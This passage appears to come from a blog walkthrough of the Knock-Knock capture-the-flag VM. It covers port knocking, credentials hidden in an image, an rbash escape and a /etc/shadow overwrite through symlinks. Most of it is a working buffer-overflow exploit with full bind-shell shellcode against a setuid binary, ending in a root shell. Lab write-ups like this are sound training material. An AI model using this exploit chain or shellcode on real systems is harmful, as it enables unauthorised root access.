    <span class="k">pass</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span></code></pre></div>


<p>Probably not the most elegant way of doing it, but I was still in a CTF mindset ;) I ran the script and then <code>nmap</code> again, but found that nothing had happened! What could be going on here? I tried to debug script a bit, added the try/except blocks to make it robust, but I couldn&rsquo;t figure out why it wasn&rsquo;t working. Maybe not all of the knocks were getting through? I decided to run the script continuously:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> python ./knock.py<span class="p">;</span> <span class="k">done</span>
port: 37586
port: 25290
port: 48122
port: 16312
port: 44654
port: 25600
port: 53987
port: 55993
&lt;snip&gt;</code></pre></div>


<p>After a while, I ran <code>nmap</code> for the umpthieth time and lo and behold, <code>ssh</code> and <code>http</code> were open! Later, when I rooted the box, I had a look at the script that sets up the port knocking. It randomizes the port order, so there&rsquo;s a one in six chance that my script gets it right. I modified it so that it completes the port-knocking every time:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="k">def</span> <span class="nf">knock</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

<span class="k">for</span> <span class="n">portlist</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
    <span class="n">knock</span><span class="p">(</span><span class="n">portlist</span><span class="p">)</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -T4 -p1-100

Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:35 CEST
Nmap scan report <span class="k">for</span> 10.8.7.101
Host is up <span class="o">(</span>0.00043s latency<span class="o">)</span>.
Not shown: <span class="m">98</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1.93 seconds</code></pre></div>


<p>I had no credentials for <code>ssh</code> so I fired up a browser and pointed it at 10.8.7.101. I also started <code>dirbuster</code> just in case.</p>

<p><img src="http://barrebas.github.io/assets/knockknock-00.png" alt="" /></p>

<p>Not much was on that webpage, not even in the source. I grabbed the image and poked at it using stego tools such as <code>stepic</code> and <code>outguess</code>, which came up negative. A quick <code>strings</code> on the jpg revealed something much more interesting:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>strings knockknock.jpg
&lt;snip&gt;
<span class="nv">CN</span><span class="o">=</span>i
<span class="se">\,</span>mk
1W<span class="o">}</span>R
LUv*
<span class="se">\U</span>v*
*M1W
tR<span class="o">)</span>O
MO:/?
qW<span class="p">|</span>U
<span class="se">\+\U</span>
Login Credentials
abfnW
sax2Cw9Ow</code></pre></div>


<p>I figured that it was worth a shot, even though the credentials looked weird. Needless to say, they didn&rsquo;t work. I switched them around as well but no luck. The strings looked mangled, so what could have been done to them? <code>rot13</code> maybe? Indeed, after dumping the strings in <a href="http://www.rot13.com/">rot13.com</a>, I got something that resembled a user name: nosaJ, which is Jason reversed. The same was done for the password and the combination that let me in was <code>jason:jB9jP2knf</code>. I could <code>ssh</code> in and was presented with a shell! I pressed &lsquo;up&rsquo; to view the command history, but <code>.bash_history</code> was symlinked to <code>/dev/null</code>. I fixed that and went on. <code>ls -alh</code> showed a setuid binary called <code>tfc</code>. Owned by root, I might add! Turns out that jason actually has a restricted bash, but that was quickly solved using <code>nice /bin/bash</code> (after Persistence, I learned four more ways of escaping <code>rbash</code> ;)).</p>

<p>Looking at this <code>tfc</code> binary, it seems that it is a &ldquo;tiny file crypter&rdquo;. Playing around with it, I was able to encrypt a file and decrypt it again. This meant that it was doing some kind of symmetrical encryption.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>./tfc
_______________________________  
<span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span> 
  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
                <span class="se">\/</span>            <span class="se">\/</span> 

    Tiny File Crypter - 1.0

Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;</code></pre></div>


<p>When I downloaded the first public version of this VM, <code>tfc</code> still allowed symlinks. It wanted the filenames to end with .tfc, so I made a symlink to <code>/etc/shadow</code>, used that as input for <code>tfc</code>, decrypted it to get the shadow file. I then copied the line containing the hash of jason&rsquo;s password and overwrote the line for root. Reversing the process again overwrote <code>/etc/shadow</code> and I had root! However, this was not intended and zer0w1re released a fixed version&hellip;</p>

<p>So I had to exploit <code>tfc</code> the proper way. Now, this binary was made by c0ne, so I was in for a treat! I first gave it a huge input file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc 
jason@knockknock:~<span class="nv">$ </span>./tfc ./in.tfc out.tfc
Segmentation fault</code></pre></div>


<p>Well, well, well, a segfault! This looked promising. Unfortunately, <code>gdb</code> was not installed on this VM, so I transferred the binary over to my box and repeated the process.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc in.tfc out.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>

bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x0675c916 in ?? ()</span>
gdb-peda<span class="err">$</span></code></pre></div>


<p>Hmm. So we have a segfault, but <code>eip</code> is not overwritten by <code>0x41414141</code>. Something funky is going on! I assumed <code>eip</code> was being overwritten by the encrypted bytes, so I needed to first encrypt my payload before <code>tfc</code> would process it and decrypt it again. Over at #vulnhub, recrudesce dropped a nice link for an online disassembler. I decided that this was a nice moment to give <a href="http://decompiler.fit.vutbr.cz/">the Retargetable Decompiler</a> a spin! I uploaded the binary and using the output and <code>objdump</code>, I started analyzing the binary.</p>

<p><img src="http://barrebas.github.io/assets/knockknock-01.png" alt="" /></p>

<p>It boils down to this: the binary takes an input file, read it four bytes at a time, and encrypts it using the <code>xcrypt</code> function. For the next four bytes, it shuffles the XOR key around. It loops until there are less than four bytes remaining, which are also encrypted. I decided to rip and copy this decompiled C code as much as possible. I have changed the names of the variables a bit:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int32_t</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span> <span class="n">a1_buffer</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">a2_buffersize</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v1_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">a1_buffer</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">v2</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
        <span class="kt">int32_t</span> <span class="n">v4_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">int32_t</span> <span class="n">v5_xor</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 0x8048634</span>
            <span class="n">v3_buffer</span><span class="p">[</span><span class="n">v4_index</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v5_xor</span><span class="p">;</span>
            
            <span class="kt">uint32_t</span> <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v5_xor</span><span class="p">;</span>
            <span class="c1">// branch -&gt; 0x8048662</span>
            <span class="kt">int32_t</span> <span class="n">v7_temp</span><span class="p">;</span> <span class="c1">// 0x804866f</span>
            
            <span class="cm">/* change v6_xor */</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">uint32_t</span> <span class="n">v8</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 0x8048678</span>
                <span class="n">v7_temp_xor</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">v8</span> <span class="p">:</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span><span class="p">;</span>
                <span class="c1">// PHI copies at the loop end</span>
                <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
                <span class="c1">// loop 0x8048662 end</span>
            <span class="p">}</span>
            
            <span class="kt">int32_t</span> <span class="n">v9_indexplusone</span> <span class="o">=</span> <span class="n">v4_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 0x8048685</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">&gt;</span> <span class="n">v9_indexplusone</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 0x8048685</span>
                <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
                <span class="n">v4_index</span> <span class="o">=</span> <span class="n">v9_index</span><span class="p">;</span>
                <span class="n">v5_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
                <span class="c1">// branch -&gt; 0x8048634</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">v2_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kt">int32_t</span> <span class="n">v10</span> <span class="o">=</span> <span class="n">a2_buffersize</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// 0x80486d7</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 0x80486df</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="cm">/* encrypt last bytes, but lets assume our sploit will be 4 byte aligned */</span></code></pre></div>


<p>I wrote a very, very ugly piece of Python do the encryption for me:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;in.tfc&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    
    <span class="n">xorkey</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span>
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
        <span class="n">int_block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">block</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">int_block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">xorkey</span><span class="p">)))</span>
        
        <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">v8</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">xorkey</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span><span class="p">)</span> <span class="c"># not sure why 0x7fff.. i.o. 0xffff</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xorkey</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span> 
                <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xorkey</span> <span class="o">=</span> <span class="n">v7</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out2.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>Like I said, a CTF mindset and some very ugly Python code, but I was now able to encode my payload (updated version at end of post). I gave it a spin:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*5000&#39;</span> &gt; in.tfc
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python ./enc.py
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Core was generated by <span class="s1">&#39;./tfc out2.tfc bleh.tfc&#39;</span>.
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x41414141 in ?? ()</span>
gdb-peda<span class="err">$</span></code></pre></div>


<p>Yeah! I was able to overwrite <code>eip</code>! I narrowed down the buffer and determined which part was responsible for overwriting <code>eip</code> by trial-and-error and looking at the stack in the coredump. I finally found:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*4124+&quot;B&quot;*4+&quot;C&quot;*4&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py 
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x42424242 in ?? ()</span>
gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda<span class="nv">$ </span>q
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc

Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
Entry point 0x8048500
There are <span class="m">8</span> program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
&lt;snip&gt;</code></pre></div>


<p>Okay, great. The stack is executable so I could stash the shellcode there. ASLR on the remote machine was enabled, so all I needed was a <code>jmp esp</code> to jump to the shellcode. I found one conveniently located in the binary, but I really had to dig:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>b main
Breakpoint <span class="m">1</span> at 0x8048927
gdb-peda<span class="nv">$ </span>r
&lt;snip&gt;
Breakpoint 1, 0x08048927 in main <span class="o">()</span>
gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xe4&quot;</span> all
Searching <span class="k">for</span> <span class="s1">&#39;\xff\xe4&#39;</span> in: all ranges
Found <span class="m">96</span> results, display max <span class="m">96</span> items:
       tfc : 0x8048e93 --&gt; 0xe4ff
       tfc : 0x8049e93 --&gt; 0xe4ff 
      libc : 0xf7e18a85 --&gt; 0x7f1be4ff 
      libc : 0xf7e4fdad <span class="o">(</span>jmp    esp<span class="o">)</span>
      libc : 0xf7f6deb3 --&gt; 0xffffe4ff 
&lt;snip&gt;
gdb-peda<span class="nv">$ </span>x/i 0x8048e93
   0x8048e93:   jmp    esp</code></pre></div>


<p>With that hurdle taken, I first verified the exploit by making the shellcode a bunch of <code>int 3</code>s. This made <code>tfc</code> crash with SIGTRAP, confirming that it worked. I used <a href="http://shell-storm.org/shellcode/files/shellcode-672.php">bind@64533</a>, my favorite shellcode. Finally, my exploit looked like this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print &quot;A&quot;*4124+ # filler</span>
<span class="s1">   &quot;\x93\x9e\x04\x08&quot;+    # overwrite eip</span>
<span class="s1">   &quot;\x83\xec\x7f&quot; +       # sub esp, 127 to reserve stack space, followed by the shellcode</span>
<span class="s1">   &quot;\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;+</span>
<span class="s1">   &quot;AAAAAAAAAAAAAAAAAAA&quot;  # some padding</span>
<span class="s1">   &#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py</code></pre></div>


<p>This generated the file <code>out2.tfc</code>. I verified the exploit locally, after which I transferred it over to knock-knock. I ran the exploit and connected to <code>localhost:64533</code> with my fingers crossed:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>xxd sploit.tfc <span class="p">|</span>head
0000000: def0 5bab 5df7 ab43 <span class="m">0690</span> fe64 6cb0 0b48  ..<span class="o">[</span>.<span class="o">]</span>..C...dl..H
0000010: <span class="m">2986</span> 416f <span class="m">7467</span> df5c 21a2 453f e5cc 806c  <span class="o">)</span>.Aotg.<span class="se">\!</span>.E?...l
0000020: 2bd0 <span class="m">0142</span> b5c2 <span class="m">2466</span> <span class="m">3525</span> c114 26dc <span class="m">1979</span>  +..B..<span class="nv">$f5</span>%..<span class="p">&amp;</span>..y
0000030: 1dd0 7c53 5b49 3b52 012e 942b 549a fe77  ..<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R...+T..w
0000040: e104 <span class="m">0424</span> cd9f e437 f09c 3f69 <span class="m">0095</span> <span class="m">7727</span>  ...<span class="nv">$.</span>..7..?i..w<span class="err">&#39;</span>
0000050: d017 <span class="m">3307</span> b61e 733c 41f9 8c5e f98c 5e41  ..3...s&lt;A..^..^A
0000060: 9a35 <span class="m">9167</span> ccf8 1f00 a809 c919 309d c241  .5.g........0..A
0000070: 8f7a 207c f8b3 <span class="m">7765</span> 9a72 <span class="m">7417</span> 8b1d 6f00  .z <span class="p">|</span>..we.rt...o.
0000080: b137 a610 ee6c 1a61 966e <span class="m">1438</span> 0c19 e245  .7...l.a.n.8...E
0000090: c7e6 f342 abc1 <span class="m">9363</span> 504c af0b 199e d551  ...B...cPL.....Q
jason@knockknock:~<span class="nv">$ </span>
jason@knockknock:~<span class="nv">$ </span>
jason@knockknock:~<span class="nv">$ </span>./tfc sploit.tfc bleh.tfc <span class="p">&amp;</span>
<span class="o">[</span>1<span class="o">]</span> 3578
jason@knockknock:~<span class="nv">$ </span>nc localhost 64533
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
whoami
root</code></pre></div>


<p>From here, I could view the flag:</p>

<p><img src="http://barrebas.github.io/assets/knockknock-02.png" alt="" /></p>

<p>Game over!</p>

<p>Or was it? leonjza came up with a nice idea, why not use the core dump instead to extract the encrypted payload? I spent some time and came up with the following bash script. It abuses the fact that the encrypted file will start with the same bytes every time. This script generates the exact same payload as before:</p>

<div><script src='https://gist.github.com/b285dd9865fe82188959.js?file=tfc_exploit.sh'></script>
<noscript><pre><code>#!/bin/bash

# exploit for last stage of knockknock vm

echo &quot;[+] building shellcode...&quot;
$(python -c 'print &quot;A&quot;*4124+&quot;\x93\x9e\x04\x08&quot;+&quot;\x83\xec\x7f\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;' &gt; in.tfc)

if [ ! -f in.tfc ];
then
    echo &quot;[!] shellcode not found!&quot;
    exit 1
fi

SPLOIT=in.tfc
SPLOIT_LEN=$(cat $SPLOIT |wc -c)

# enable coredumps
ulimit -c unlimited
# copy the setuid binary
cp ./tfc ./pwn
# use tfc to encode shellcode
./pwn $SPLOIT derp.tfc 2&amp;&gt;/dev/null

if [ -f core ]; then
    echo &quot;[+] core found.&quot; 
    # because of the way the encryption works, the first four 
    # bytes are always def0 5bab. let's abuse this fact.
